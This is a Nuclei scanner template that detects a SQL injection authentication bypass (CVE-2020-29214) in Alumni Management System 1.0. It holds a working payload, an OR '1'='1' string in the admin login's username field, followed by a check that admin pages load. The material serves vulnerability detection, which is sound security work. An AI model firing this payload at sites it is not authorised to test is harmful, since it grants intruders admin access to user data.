id: alumni-management-sqli
info:
  name: Alumni Management System 1.0 - SQL Injection
  author: arafatansari
  severity: critical
  description: The Alumni Management System 1.0 is vulnerable to SQL injection via
    the username parameter in admin/login, potentially allowing an attacker to access
    sensitive information, modify data, and perform unauthorized administrative actions
    on the affected site.
  reference:
  - https://www.exploit-db.com/exploits/48883
  - https://nvd.nist.gov/vuln/detail/CVE-2020-29214
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: sqli,auth-bypass,cms,edb,alumni
  metadata:
    impact: The SQL injection vulnerability in Alumni Management System 1.0 could
      lead to unauthorized access and manipulation of sensitive data, potentially
      causing significant harm to the affected site and its users.
    recommendation: I highly recommend that the alumni management system be updated
      immediately to address the SQL injection vulnerability in order to prevent potential
      data breaches and unauthorized access.
requests:
- raw:
  - 'POST /admin/ajax.php?action=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin''+or+''1''%3D''1''%23&password=nuclei

    '
  - 'GET /admin/index.php?page=home HTTP/1.1

    Host: {{Hostname}}

    '
  cookie-reuse: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - Welcome back Admin!
    - Alumni List
    condition: and
  - type: word
    part: body
    words:
    - '#login-form'
    negative: true
  - type: status
    status:
    - 200
